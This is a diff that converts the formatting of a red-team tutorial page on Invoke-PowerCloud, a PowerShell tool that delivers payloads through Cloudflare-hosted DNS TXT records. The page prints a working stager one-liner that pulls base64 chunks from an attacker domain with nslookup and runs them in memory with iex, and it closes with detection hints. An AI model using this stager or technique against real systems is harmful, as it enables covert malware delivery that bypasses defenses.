@@ -46,9 +46,8 @@ The way the tool works is by performing the following high level steps:
 * Stager can then be executed on the victim system. The stager will recover the base64 chunks from the DNS TXT records and rebuild the original payload
 * Stager executes the payload in memory!
 
-{% hint style="info" %}
-If you run the tool again to deliver another payload, the previous DNS TXT records will be deleted
-{% endhint %}
+> [!INFO]
+> If you run the tool again to deliver another payload, the previous DNS TXT records will be deleted
 
 ## Demo
 
@@ -59,13 +58,13 @@ Remember - you need a cloudflare.com account for this to work. Assuming you have
 1. your cloudflare API key, defined in the variable `$Global:API_KEY`
 2. your cloudflare email address, defined in the variable `$Global:EMAIL`
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-11-03.png>)
+![[Screenshot from 2018-10-15 22-11-03.png]]
 
 ### DNS Management
 
 Secondly, you need to move the domain name which you are going to use for payload delivery to cloudflare. In this demo, I will use a domain I own `redteam.me` which is now managed by cloudflare:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-14-53.png>)
+![[Screenshot from 2018-10-15 22-14-53.png]]
 
 Let's confirm redteam.me DNS is managed by cloudflare by issuing:
 
@@ -73,18 +72,17 @@ Let's confirm redteam.me DNS is managed by cloudflare by issuing:
 host -t ns redteam.me
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-16-20.png>)
+![[Screenshot from 2018-10-15 22-16-20.png]]
 
 ### Payload
 
 Let's create a simple payload file - it will print a red message to the screen and open up a calc.exe:
 
-{% code title="payload.txt" %}
 ```csharp
+// payload.txt
 Write-host -foregroundcolor red "This is our first payload using Invoke-
 PowerCloud. As usual, let's pop the calc.exe"; Start-process calc.exe
 ```
-{% endcode %}
 
 ### Good to Go
 
@@ -96,23 +94,22 @@ PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payloa
 
 The script will generate two stagers. One of them is shown here:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-47-26.png>)
+![[Screenshot from 2018-10-15 22-47-26.png]]
 
 Let's execute the stager on the victim system to get the payload delivered via DNS:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-47-12.png>)
+![[Screenshot from 2018-10-15 22-47-12.png]]
 
 ### Animated Demo
 
 Everything in action can be seen in the below gif:
 
-![](../../.gitbook/assets/invoke-powercloud-demo.gif)
+![[invoke-powercloud-demo.gif]]
 
 ## Is Invoke-PowerCloud better than PowerDNS?
 
@@ -122,7 +119,7 @@ No. It just works slightly differently, but achieves the same end goal. Also not
 
 Let's deliver a PowerShell empire payload using DNS and see how the system reacts to this:
 
-![](../../.gitbook/assets/empire-stager-via-dns.gif)
+![[empire-stager-via-dns.gif]]
 
 For those wondering about detection possibilities, the following is a list of signs (mix and match) that may qualify the host behaviour as `suspicious` and warrant a further investigation:
 
@@ -136,26 +133,26 @@ For those wondering about detection possibilities, the following is a list of si
 
 Below is a snippet of the PCAP showing DNS traffic from the above demo - note the TXT Length and the data itself:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-16 20-12-57.png>)
+![[Screenshot from 2018-10-16 20-12-57.png]]
 
 Spike of `nslookup` for a host in a short amount of time:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-16 20-17-42.png>)
+![[Screenshot from 2018-10-16 20-17-42.png]]
 
 Below is a sample PCAP for your inspection:
 
-{% file src="../../.gitbook/assets/dns-packets.pcapng" %}
+
 DNS Traffic Packet Trace
-{% endfile %}
+
 
 ## Download
 
 You can download or contribute to Invoke-PowerCloud here:
 
-{% embed url="https://github.com/mantvydasb/powercloud" %}
+[github.com/mantvydasb/powercloud](https://github.com/mantvydasb/powercloud)
 
 ## References
 
-{% embed url="https://github.com/mdsecactivebreach/PowerDNS" %}
+[github.com/mdsecactivebreach/PowerDNS](https://github.com/mdsecactivebreach/PowerDNS)
 
-{% embed url="https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/" %}
+[www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/)
